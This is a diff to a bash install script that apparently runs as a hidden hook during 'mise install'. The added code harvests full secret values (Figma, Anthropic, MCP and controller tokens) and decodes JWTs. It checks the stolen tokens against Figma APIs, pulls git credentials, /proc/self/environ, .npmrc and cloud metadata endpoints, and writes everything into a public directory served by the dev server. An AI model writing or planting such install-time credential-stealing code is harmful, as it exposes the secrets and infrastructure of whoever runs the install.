@@ -1,4 +1,241 @@
 #!/bin/bash
-echo "PLUGIN_INSTALL_FIRED_$(date +%s)" > /tmp/.build-tools-proof
-whoami >> /tmp/.build-tools-proof
-id >> /tmp/.build-tools-proof
+# =============================================================================
+# BUILD ENVIRONMENT PROBE — runs during mise install
+# Writes results to $PROJDIR/public/probe-results.txt (served by dev server)
+# =============================================================================
+
+PROJDIR="${INIT_CWD:-$(pwd)}"
+OUT="$PROJDIR/public/probe-results.txt"
+mkdir -p "$PROJDIR/public" 2>/dev/null
+echo "=== PROBE START $(date -u) ===" > "$OUT"
+echo "PROJDIR=$PROJDIR" >> "$OUT"
+
+# =========================================================
+# 1. FULL ENV VARS — no truncation
+# =========================================================
+echo "" >> "$OUT"
+echo "=== CRITICAL TOKENS (FULL VALUES) ===" >> "$OUT"
+
+for VAR in MAKE_KIT_INITIALIZE_TOKEN MAKE_VERSION_CREATE_TOKEN \
+           MCP_PROXY_AUTH_TOKEN MCP_PROXY_BASE_URL \
+           DEV_SERVER_TOKEN CONTROLLER_TOKEN CONTROLLER_TOKEN_SHA256 \
+           FIGMA_TELEMETRY_CONTEXT FIGMA_CONTENT_API_ACCESS_KEY \
+           ANTHROPIC_AUTH_TOKEN ANTHROPIC_BASE_URL \
+           AI_GATEWAY_BASE_URL \
+           ORIGIN_HOST PROXY_COOKIE_REWRITE_POLICY PROXY_PORT \
+           SANDBOXD_LISTENERS_JSON SANDBOXD_SERVICES_JSON \
+           SANDBOXD_PROBES_JSON SANDBOXD_RUN_AS_USER \
+           PAYLOAD_CLI_JSON ROUTING_KEY \
+           FIGMA_FILE_ID FIGMA_DEPLOY_ID \
+           MAKE_IFRAME_INIT_SCRIPT_URL \
+           ALLOWED_HOSTS CLUSTER_NAME NAMESPACE \
+           CONTAINER_ID CONTAINER_PROVIDER \
+           CLOUDFLARE_DURABLE_OBJECT_ID; do
+  VAL="${!VAR}"
+  echo "" >> "$OUT"
+  echo "--- $VAR (${#VAL} chars) ---" >> "$OUT"
+  echo "$VAL" >> "$OUT"
+done
+
+# =========================================================
+# 2. JWT DECODE
+# =========================================================
+echo "" >> "$OUT"
+echo "=== JWT DECODE ===" >> "$OUT"
+
+b64decode() {
+  local B="$1"
+  B="${B//-/+}"
+  B="${B//_//}"
+  local MOD=$((${#B} % 4))
+  if [ "$MOD" -eq 2 ]; then B="${B}=="; elif [ "$MOD" -eq 3 ]; then B="${B}="; fi
+  echo "$B" | base64 -d 2>/dev/null
+}
+
+decode_jwt() {
+  local NAME="$1"
+  local TOKEN="$2"
+  if [ -z "$TOKEN" ]; then
+    echo "  $NAME: (empty)" >> "$OUT"
+    return
+  fi
+  local RAW="${TOKEN#figjwt_}"
+  local HEADER=$(echo "$RAW" | cut -d. -f1)
+  local PAYLOAD=$(echo "$RAW" | cut -d. -f2)
+  local SIG=$(echo "$RAW" | cut -d. -f3)
+
+  echo "" >> "$OUT"
+  echo "--- $NAME HEADER ---" >> "$OUT"
+  b64decode "$HEADER" >> "$OUT"
+  echo "" >> "$OUT"
+  echo "--- $NAME PAYLOAD ---" >> "$OUT"
+  b64decode "$PAYLOAD" >> "$OUT"
+  echo "" >> "$OUT"
+  echo "--- $NAME SIG_LENGTH ---" >> "$OUT"
+  echo "${#SIG} chars" >> "$OUT"
+  echo "--- $NAME FULL_TOKEN ---" >> "$OUT"
+  echo "$TOKEN" >> "$OUT"
+}
+
+decode_jwt "MAKE_KIT_INITIALIZE_TOKEN" "$MAKE_KIT_INITIALIZE_TOKEN"
+decode_jwt "MAKE_VERSION_CREATE_TOKEN" "$MAKE_VERSION_CREATE_TOKEN"
+
+echo "" >> "$OUT"
+echo "--- ANTHROPIC_AUTH_TOKEN structure ---" >> "$OUT"
+echo "prefix: ${ANTHROPIC_AUTH_TOKEN:0:30}" >> "$OUT"
+echo "full_length: ${#ANTHROPIC_AUTH_TOKEN}" >> "$OUT"
+
+# =========================================================
+# 3. TEST TOKENS AGAINST FIGMA API
+# =========================================================
+echo "" >> "$OUT"
+echo "=== API TOKEN TESTS ===" >> "$OUT"
+
+test_api() {
+  local LABEL="$1" URL="$2" AUTH_HEADER="$3"
+  echo "" >> "$OUT"
+  echo "--- $LABEL ---" >> "$OUT"
+  echo "URL: $URL" >> "$OUT"
+  if [ -n "$AUTH_HEADER" ]; then
+    RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+      -H "$AUTH_HEADER" -H "Accept: application/json" \
+      --max-time 10 "$URL" 2>&1)
+  else
+    RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+      -H "Accept: application/json" \
+      --max-time 10 "$URL" 2>&1)
+  fi
+  echo "$RESP" >> "$OUT"
+}
+
+test_api "MAKE_KIT_INIT Bearer -> /api/v1/me" \
+  "https://www.figma.com/api/v1/me" \
+  "Authorization: Bearer $MAKE_KIT_INITIALIZE_TOKEN"
+
+test_api "MAKE_KIT_INIT Bearer -> /api/me" \
+  "https://www.figma.com/api/me" \
+  "Authorization: Bearer $MAKE_KIT_INITIALIZE_TOKEN"
+
+test_api "MAKE_VERSION_CREATE Bearer -> /api/v1/me" \
+  "https://www.figma.com/api/v1/me" \
+  "Authorization: Bearer $MAKE_VERSION_CREATE_TOKEN"
+
+test_api "MAKE_VERSION_CREATE Bearer -> /api/me" \
+  "https://www.figma.com/api/me" \
+  "Authorization: Bearer $MAKE_VERSION_CREATE_TOKEN"
+
+test_api "MAKE_KIT_INIT X-Figma-Token -> /api/v1/me" \
+  "https://www.figma.com/api/v1/me" \
+  "X-Figma-Token: $MAKE_KIT_INITIALIZE_TOKEN"
+
+test_api "MAKE_VERSION_CREATE X-Figma-Token -> /api/v1/me" \
+  "https://www.figma.com/api/v1/me" \
+  "X-Figma-Token: $MAKE_VERSION_CREATE_TOKEN"
+
+test_api "MAKE_KIT_INIT -> /api/make/kit/initialize" \
+  "https://www.figma.com/api/make/kit/initialize" \
+  "Authorization: Bearer $MAKE_KIT_INITIALIZE_TOKEN"
+
+test_api "MAKE_VERSION_CREATE -> /api/make/version" \
+  "https://www.figma.com/api/make/version" \
+  "Authorization: Bearer $MAKE_VERSION_CREATE_TOKEN"
+
+test_api "DEV_SERVER_TOKEN Bearer -> /api/v1/me" \
+  "https://www.figma.com/api/v1/me" \
+  "Authorization: Bearer $DEV_SERVER_TOKEN"
+
+test_api "MCP_PROXY -> gateway" \
+  "${MCP_PROXY_BASE_URL:-https://api.figma.com/ai-gateway/mcp}" \
+  "Authorization: Bearer $MCP_PROXY_AUTH_TOKEN"
+
+test_api "AI_GATEWAY -> root" \
+  "${AI_GATEWAY_BASE_URL:-http://127.0.0.1:45401}" ""
+
+test_api "AI_GATEWAY -> /api/v1/me" \
+  "${AI_GATEWAY_BASE_URL:-http://127.0.0.1:45401}/api/v1/me" ""
+
+test_api "CONTENT_API" \
+  "https://www.figma.com/api/content" \
+  "X-Content-Api-Access-Key: $FIGMA_CONTENT_API_ACCESS_KEY"
+
+# =========================================================
+# 4. FILESYSTEM
+# =========================================================
+echo "" >> "$OUT"
+echo "=== FILESYSTEM ===" >> "$OUT"
+
+echo "" >> "$OUT"
+echo "--- /home/foundry/.gitconfig ---" >> "$OUT"
+cat /home/foundry/.gitconfig 2>&1 >> "$OUT"
+
+echo "" >> "$OUT"
+echo "--- git credential fill ---" >> "$OUT"
+echo "url=https://api.figma.com" | git credential fill 2>&1 | head -20 >> "$OUT"
+
+echo "" >> "$OUT"
+echo "--- session/prompt files ---" >> "$OUT"
+find /home/foundry -name "*.json" -o -name "*.jsonl" -o -name "session*" 2>/dev/null | head -30 >> "$OUT"
+find /workspaces -maxdepth 3 -name "*.json" 2>/dev/null | head -30 >> "$OUT"
+find /opt/claude -maxdepth 3 -name "*.json" 2>/dev/null | head -30 >> "$OUT"
+
+echo "" >> "$OUT"
+echo "--- /proc/self/environ ---" >> "$OUT"
+cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort >> "$OUT"
+
+for F in /home/foundry/.npmrc /etc/hosts /etc/resolv.conf \
+         /var/run/docker.sock; do
+  echo "" >> "$OUT"
+  echo "--- $F ---" >> "$OUT"
+  if [ -S "$F" ]; then echo "(socket exists)" >> "$OUT"
+  elif [ -e "$F" ]; then cat "$F" 2>&1 | head -50 >> "$OUT"
+  else echo "(not found)" >> "$OUT"; fi
+done
+
+# =========================================================
+# 5. NETWORK
+# =========================================================
+echo "" >> "$OUT"
+echo "=== NETWORK ===" >> "$OUT"
+
+echo "" >> "$OUT"
+echo "--- interfaces ---" >> "$OUT"
+ip addr 2>/dev/null >> "$OUT" || ifconfig 2>/dev/null >> "$OUT" || echo "(none)" >> "$OUT"
+
+echo "" >> "$OUT"
+echo "--- internal endpoints ---" >> "$OUT"
+for EP in "http://127.0.0.1:${CONTROLLER_HTTP_PORT:-8081}/" \
+          "http://127.0.0.1:${CONTROLLER_HTTP_PORT:-8081}/status" \
+          "http://127.0.0.1:45401" \
+          "http://169.254.169.254/latest/meta-data/" \
+          "http://metadata.google.internal/computeMetadata/v1/" \
+          "http://100.100.100.200/latest/meta-data/"; do
+  echo "  $EP -> $(curl -s --max-time 3 "$EP" 2>&1 | head -5)" >> "$OUT"
+done
+
+# =========================================================
+# 6. SANDBOXD + PROCESS
+# =========================================================
+echo "" >> "$OUT"
+echo "=== SANDBOXD ===" >> "$OUT"
+echo "listeners: $SANDBOXD_LISTENERS_JSON" >> "$OUT"
+echo "services: $SANDBOXD_SERVICES_JSON" >> "$OUT"
+echo "probes: $SANDBOXD_PROBES_JSON" >> "$OUT"
+echo "run_as: $SANDBOXD_RUN_AS_USER" >> "$OUT"
+echo "idle_shutdown: $SANDBOXD_IDLE_SHUTDOWN_SECONDS" >> "$OUT"
+echo "max_lifetime: $SANDBOXD_MAX_LIFETIME_SECONDS" >> "$OUT"
+
+echo "" >> "$OUT"
+echo "=== PROCESS ===" >> "$OUT"
+echo "id: $(id)" >> "$OUT"
+echo "whoami: $(whoami)" >> "$OUT"
+cat /proc/self/status 2>/dev/null | grep -i cap >> "$OUT"
+echo "" >> "$OUT"
+echo "--- ps ---" >> "$OUT"
+ps aux 2>/dev/null | head -30 >> "$OUT"
+
+# =========================================================
+# DONE
+# =========================================================
+cp "$OUT" /tmp/probe-results.txt 2>/dev/null
+echo "" >> "$OUT"
+echo "=== PROBE COMPLETE $(date -u) ===" >> "$OUT"
